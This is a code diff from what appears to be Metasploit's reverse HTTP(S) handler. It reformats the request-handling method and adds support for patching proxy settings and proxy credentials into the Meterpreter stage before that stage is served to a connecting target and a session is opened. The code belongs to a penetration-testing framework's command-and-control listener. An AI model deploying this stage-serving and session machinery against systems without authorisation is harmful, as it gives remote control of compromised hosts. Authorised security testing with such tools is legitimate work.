@@ -241,135 +241,171 @@ module ReverseHttp
 
 protected
 
-	#
-	# Parses the HTTPS request
-	#
-	def on_request(cli, req, obj)
-		sid  = nil
-		resp = Rex::Proto::Http::Response.new
+  #
+  # Parses the HTTPS request
+  #
+  def on_request(cli, req, obj)
+    sid  = nil
+    resp = Rex::Proto::Http::Response.new
 
-		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
+    print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
 
-		uri_match = process_uri_resource(req.relative_resource)
+    uri_match = process_uri_resource(req.relative_resource)
 
-		# Process the requested resource.
-		case uri_match
-			when /^\/INITJM/
-				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-				url = full_uri + conn_id + "/\x00"
+    # Process the requested resource.
+    case uri_match
+      when /^\/INITJM/
+        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+        url = full_uri + conn_id + "/\x00"
 
-				blob = ""
-				blob << obj.generate_stage
+        blob = ""
+        blob << obj.generate_stage
 
-				# This is a TLV packet - I guess somewhere there should be API for building them
-				# in Metasploit :-)
-				packet = ""
-				packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
-				packet << [url.length+8, 0x1000a].pack('NN')+url
-				packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
-				packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
-				blob << [packet.length+8, 0].pack('NN') + packet
+        # This is a TLV packet - I guess somewhere there should be API for building them
+        # in Metasploit :-)
+        packet = ""
+        packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
+        packet << [url.length+8, 0x1000a].pack('NN')+url
+        packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
+        packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
+        blob << [packet.length+8, 0].pack('NN') + packet
 
-				resp.body = blob
+        resp.body = blob
 
-				# Short-circuit the payload's handle_connection processing for create_session
-				create_session(cli, {
-					:passive_dispatcher => obj.service,
-					:conn_id            => conn_id,
-					:url                => url,
-					:expiration         => datastore['SessionExpirationTimeout'].to_i,
-					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-					:ssl                => ssl?
-				})
+        # Short-circuit the payload's handle_connection processing for create_session
+        create_session(cli, {
+          :passive_dispatcher => obj.service,
+          :conn_id            => conn_id,
+          :url                => url,
+          :expiration         => datastore['SessionExpirationTimeout'].to_i,
+          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :ssl                => ssl?
+        })
 
-			when /^\/A?INITM?/
+      when /^\/A?INITM?/
 
-				url = ''
+        url = ''
 
-				print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
-				resp['Content-Type'] = 'application/octet-stream'
+        print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
+        resp['Content-Type'] = 'application/octet-stream'
 
-				blob = obj.stage_payload
+        blob = obj.stage_payload
 
-				# Replace the user agent string with our option
-				i = blob.index("METERPRETER_UA\x00")
-				if i
-					str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
-					blob[i, str.length] = str
-					print_status("Patched user-agent at offset #{i}...")
-				end
+        # Replace the user agent string with our option
+        i = blob.index("METERPRETER_UA\x00")
+        if i
+          str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
+          blob[i, str.length] = str
+          print_status("Patched user-agent at offset #{i}...")
+        end
 
-				# Replace the transport string first (TRANSPORT_SOCKET_SSL)
-				i = blob.index("METERPRETER_TRANSPORT_SSL")
-				if i
-					str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
-					blob[i, str.length] = str
-				end
-				print_status("Patched transport at offset #{i}...")
+        # Activate a custom proxy
+        i = blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+        if i
+          if datastore['PROXYHOST']
+            if datastore['PROXYHOST'].to_s != ""
+              proxyhost = datastore['PROXYHOST'].to_s
+              proxyport = datastore['PROXYPORT'].to_s || "8080"
+              proxyinfo = proxyhost + ":" + proxyport
+              if proxyport == "80"
+                proxyinfo = proxyhost
+              end
+              if datastore['PROXY_TYPE'].to_s == 'HTTP'
+                proxyinfo = 'http://' + proxyinfo
+              else #socks
+                proxyinfo = 'socks=' + proxyinfo
+              end
+              proxyinfo << "\x00"
+              blob[i, proxyinfo.length] = proxyinfo
+              print_status("Activated custom proxy #{proxyinfo}, patch at offset #{i}...")
+              #Optional authentification
+              unless 	(datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
+                (datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
+                datastore['PROXY_TYPE'] == 'SOCKS'
+                
+                proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+                proxy_username = datastore['PROXY_USERNAME'] << "\x00"
+                blob[proxy_username_loc, proxy_username.length] = proxy_username
 
-				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-				i = blob.index("https://" + ("X" * 256))
-				if i
-					url = full_uri + conn_id + "/\x00"
-					blob[i, url.length] = url
-				end
-				print_status("Patched URL at offset #{i}...")
+                proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+                proxy_password = datastore['PROXY_PASSWORD'] << "\x00"
+                blob[proxy_password_loc, proxy_password.length] = proxy_password
+              end
+            end
+          end
+        end
 
-				i = blob.index([0xb64be661].pack("V"))
-				if i
-					str = [ datastore['SessionExpirationTimeout'] ].pack("V")
-					blob[i, str.length] = str
-				end
-				print_status("Patched Expiration Timeout at offset #{i}...")
+        # Replace the transport string first (TRANSPORT_SOCKET_SSL)
+        i = blob.index("METERPRETER_TRANSPORT_SSL")
+        if i
+          str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
+          blob[i, str.length] = str
+        end
+        print_status("Patched transport at offset #{i}...")
 
-				i = blob.index([0xaf79257f].pack("V"))
-				if i
-					str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
-					blob[i, str.length] = str
-				end
-				print_status("Patched Communication Timeout at offset #{i}...")
+        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+        i = blob.index("https://" + ("X" * 256))
+        if i
+          url = full_uri + conn_id + "/\x00"
+          blob[i, url.length] = url
+        end
+        print_status("Patched URL at offset #{i}...")
 
-				resp.body = encode_stage(blob)
+        i = blob.index([0xb64be661].pack("V"))
+        if i
+          str = [ datastore['SessionExpirationTimeout'] ].pack("V")
+          blob[i, str.length] = str
+        end
+        print_status("Patched Expiration Timeout at offset #{i}...")
 
-				# Short-circuit the payload's handle_connection processing for create_session
-				create_session(cli, {
-					:passive_dispatcher => obj.service,
-					:conn_id            => conn_id,
-					:url                => url,
-					:expiration         => datastore['SessionExpirationTimeout'].to_i,
-					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-					:ssl                => ssl?,
-				})
+        i = blob.index([0xaf79257f].pack("V"))
+        if i
+          str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
+          blob[i, str.length] = str
+        end
+        print_status("Patched Communication Timeout at offset #{i}...")
 
-			when /^\/CONN_.*\//
-				resp.body = ""
-				# Grab the checksummed version of CONN from the payload's request.
-				conn_id = req.relative_resource.gsub("/", "")
+        resp.body = encode_stage(blob)
 
-				print_status("Incoming orphaned session #{conn_id}, reattaching...")
+        # Short-circuit the payload's handle_connection processing for create_session
+        create_session(cli, {
+          :passive_dispatcher => obj.service,
+          :conn_id            => conn_id,
+          :url                => url,
+          :expiration         => datastore['SessionExpirationTimeout'].to_i,
+          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :ssl                => ssl?,
+        })
 
-				# Short-circuit the payload's handle_connection processing for create_session
-				create_session(cli, {
-					:passive_dispatcher => obj.service,
-					:conn_id            => conn_id,
-					:url                => full_uri + conn_id + "/\x00",
-					:expiration         => datastore['SessionExpirationTimeout'].to_i,
-					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-					:ssl                => ssl?,
-				})
+      when /^\/CONN_.*\//
+        resp.body = ""
+        # Grab the checksummed version of CONN from the payload's request.
+        conn_id = req.relative_resource.gsub("/", "")
 
-			else
-				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
-				resp.code    = 200
-				resp.message = "OK"
-				resp.body    = datastore['HttpUnknownRequestResponse'].to_s
-		end
+        print_status("Incoming orphaned session #{conn_id}, reattaching...")
 
-		cli.send_response(resp) if (resp)
+        # Short-circuit the payload's handle_connection processing for create_session
+        create_session(cli, {
+          :passive_dispatcher => obj.service,
+          :conn_id            => conn_id,
+          :url                => full_uri + conn_id + "/\x00",
+          :expiration         => datastore['SessionExpirationTimeout'].to_i,
+          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :ssl                => ssl?,
+        })
 
-		# Force this socket to be closed
-		obj.service.close_client( cli )
-	end
+      else
+        print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
+        resp.code    = 200
+        resp.message = "OK"
+        resp.body    = datastore['HttpUnknownRequestResponse'].to_s
+    end
+
+    cli.send_response(resp) if (resp)
+
+    # Force this socket to be closed
+    obj.service.close_client( cli )
+  end
 
 
 end
